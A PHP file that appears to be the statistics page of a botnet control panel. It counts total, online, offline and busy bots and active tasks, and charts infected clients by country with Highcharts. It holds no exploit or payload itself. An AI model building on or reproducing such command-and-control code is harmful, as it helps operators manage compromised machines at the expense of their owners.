<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	class Template_GlobalStatistic
	{
		private $Content = NULL;
		private $Title = 'Global Statistic';
		
		public function __construct()
		{
			global $DB;
			
			$this->CreateGraph();
			
			$Query = $DB->Query("SELECT (SELECT COUNT(*) FROM clients) AS stat_total, 
				(SELECT COUNT(*) FROM clients WHERE Request > '" . (time() - ST_BOT_TIME_ON) . "') AS stat_online, 
					(SELECT COUNT(*) FROM clients WHERE Request > '" . (time() - ST_BOT_TIME_ON) . "' AND TID > '0') AS stat_busy,
						(SELECT COUNT(*) FROM tasks AS t WHERE t.elapsed > '" . time() . "' OR (t.elapsed = '0' AND (SELECT COUNT(*) FROM tasks_done WHERE TID = t.TID) < t.clients)) AS stat_tasks;");
			
			$Data = $DB->GetRowArray($Query);
			$OfflineCount = ($Data['stat_total'] - $Data['stat_online']);
			
			$this->Content .= ('<center>
				<table style="width:350px;">
					<tr><td><b>Total Bots:</b></td><td width="55%">' . $Data['stat_total'] . '</td></tr>
					<tr><td><b>Online Bots:</b></td><td>' . $Data['stat_online'] . ' (' . round(($Data['stat_online'] / $Data['stat_total'] * 100), 2) . '%)' . '</td></tr>
					<tr><td><b>Offline Bots:</b></td><td>' . $OfflineCount . ' (' . round(($OfflineCount / $Data['stat_total'] * 100), 2) . '%)' . '</td></tr>
					<tr><td><b>Busy Bots:</b></td><td>' . $Data['stat_busy'] . ' (' . round(($Data['stat_busy'] / $Data['stat_total'] * 100), 2) . '%)' . '</td></tr>
					<tr><td><b>Active Tasks:</b></td><td>' . $Data['stat_tasks'] . '</td></tr>
				</table>');
			
			$this->Content .= ('<blockquote><div id="container" style="width: 800px; height: 400px; margin: 0 auto;"></div></blockquote></center>');
		}
		
		private function CreateGraph()
		{
			global $Base;
			global $DB;
			
			$Result = $DB->Query("SELECT Country, COUNT(*) as Count FROM clients GROUP BY Country ORDER BY Count DESC LIMIT 10;"); 
			$Clients = $DB->GetRow($DB->Query("SELECT COUNT(*) as Count FROM clients;"));
			
			while($Data = $DB->GetRow($Result))
				$Values[] = array(($Base->GetCountryName($Data['Country']) . ' (' . ($Data['Country'] ? $Data['Country'] : '??') . ')'), (intval($Data['Count']) / (intval($Clients['Count']) * 100)));
			
			$Index = ((count($Values) - 1) > 0 ? 1 : 0);
			$Values[$Index] = array('name' => $Values[$Index][0], 'y' => $Values[$Index][1], 'sliced' => true, 'selected' => true);
			
			$this->Content .= ("<script type='text/javascript'>
									var chart;
									var num = '" . $Clients['Count'] . "';
									
									$(document).ready(function() {
										chart = new Highcharts.Chart({										
											chart: {
												renderTo: 'container',
												plotBackgroundColor: null,
												plotBorderWidth: null,
												plotShadow: false
											},
											title: {
												text: 'Country Statistic (Top 10)'
											},
											tooltip: {
												formatter: function() {
													if (num > 0)
													{
														return '<b>'+ this.point.name +'</b>: '+ Math.round(parseFloat(this.percentage) / 100 * num) +' / '+ num +' Clients';
													} else { return '<b>No Clients could be found</b>'; }
												}
											},
											plotOptions: {
												pie: {
													allowPointSelect: true,
													cursor: 'pointer',
													dataLabels: {
														enabled: true,
														color: '#000000',
														connectorColor: '#000000',
														formatter: function() {
															return '<b>'+ this.point.name +'</b>: '+ parseFloat(new Number(this.percentage+'').toFixed(parseInt(3))) +' %';
														}
													}
												}
											},
											series: [{
												type: 'pie',
												data: [" . ($Clients['Count'] > 0 ? substr(json_encode($Values), 1, -1) : "['No Data could be collected yet', 100]") . "]
											}]
										});
									});
								</script>");
		}
		
		public function GetContent()
		{
			return $this->Content;
		}
		
		public function GetTitle()
		{
			return $this->Title;
		}
	}
?>